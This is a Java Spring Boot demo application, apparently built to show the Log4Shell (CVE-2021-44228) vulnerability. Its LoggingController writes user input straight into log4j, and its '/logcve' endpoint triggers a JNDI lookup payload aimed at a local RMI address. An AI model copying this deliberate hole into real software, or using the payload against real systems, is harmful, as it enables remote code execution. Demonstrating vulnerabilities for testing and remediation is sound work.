/*
 * Copyright (c) 2021 VMware, Inc. or its affiliates
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.moussaud.demos.cnb.springboot;

import lombok.Getter;
import lombok.RequiredArgsConstructor;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.ConfigurationPropertiesScan;
import org.springframework.boot.context.properties.ConstructorBinding;
import org.springframework.context.ApplicationContext;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;
import java.util.TreeMap;

@SpringBootApplication
@ConfigurationPropertiesScan
public class Application {
    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }
}

@ConfigurationProperties("app")
@ConstructorBinding
@RequiredArgsConstructor
class AppProperties {
    @Getter
    private final String message;
    @Getter
    private final String title;
}

@Controller
@RequiredArgsConstructor
class IndexController {
    private final AppProperties props;

    @GetMapping("/")
    String index(Map<String, Object> model) {
        model.put("message", props.getMessage());
        model.put("title", props.getTitle());
        model.put("java", "Java " + System.getProperty("java.version"));
        model.put("spring.boot", "Spring Boot " + SpringBootApplication.class.getPackage().getImplementationVersion());
        model.put("spring", "Spring " + ApplicationContext.class.getPackage().getImplementationVersion());
        model.put("os", System.getProperty("os.name") + " " + System.getProperty("os.version"));

        return "index";
    }
}

@RestController
@RequiredArgsConstructor
class GreetingsController {
    private final AppProperties props;

    @GetMapping(value = "/greetings", produces = MediaType.TEXT_PLAIN_VALUE)
    String greetings() {
        return props.getMessage();
    }
}

@RestController
@RequiredArgsConstructor
class LoggingController {

    
    private static final Logger logger = LogManager.getLogger(LoggingController.class);

    @GetMapping(value = "/log", produces = MediaType.TEXT_PLAIN_VALUE)
    String log(@RequestParam(value = "message", defaultValue = "HelloWorld") String message) {
        String logmgs = "message is " + message;
        logger.error("Running ${java:runtime} ");
        logger.error(logmgs);
        return logmgs;
    }

    @GetMapping(value = "/logcve", produces = MediaType.TEXT_PLAIN_VALUE)
    String cve() {
        return log("${jndi:rmi://127.0.0.1:9898/a})");
    }
}

@RestController
class InfoController {
    @GetMapping(value = "/info")
    Map<String, Object> info() {
        // Use a TreeMap to sort entries, and get a consistent result.
        final var info = new TreeMap<String, Object>();
        info.put("java", "Java " + System.getProperty("java.version"));
        info.put("spring.boot", "Spring Boot " + SpringBootApplication.class.getPackage().getImplementationVersion());
        info.put("spring", "Spring " + ApplicationContext.class.getPackage().getImplementationVersion());
        info.put("os", System.getProperty("os.name") + " " + System.getProperty("os.version"));
        return info;
    }
}
